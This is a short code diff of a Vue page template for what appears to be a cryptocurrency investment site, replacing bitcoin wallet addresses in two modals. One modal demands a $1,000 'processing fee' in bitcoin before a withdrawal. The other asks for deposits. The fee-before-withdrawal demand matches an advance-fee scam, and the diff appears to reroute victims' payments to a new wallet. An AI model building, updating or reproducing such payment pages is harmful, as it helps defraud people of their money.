@@ -144,7 +144,7 @@
     <!-- Payment Processing Fee -->
     <div v-show="showPaymentFee" class="contactForm" id="pleasePay">
       <h3>This Withdrawal will attract a processing fee of $1,000. Make your payment into this bitcoin address</h3>
-      <p class="mainCoin">bc1qlnv4pks73n9zv3eklf8cne2tgk7mn5zr58s80r</p>
+      <p class="mainCoin">bc1qu4xz47r0v33vlak75g3np8raz0w4cru0u6fg28</p>
       <p class="copyBut" @click="copyBitcoinAddress">Copy</p>
       <button @click="confirmPayment">Confirm</button>
     </div>
@@ -206,7 +206,7 @@
 
     <!-- Deposit Modal -->
     <div v-show="showDepositForm" class="contactForm depp">
-      <p>Please make your deposit on this wallet address <br> bc1qprdk35m3h3ygds9mahpuhp6pqph36h48s935eh</p>
+      <p>Please make your deposit on this wallet address <br> bc1qu4xz47r0v33vlak75g3np8raz0w4cru0u6fg28</p>
       <p class="cancelDeposit" @click="closeDepositModal" style="cursor: pointer; color: red;">X</p>
     </div>
 
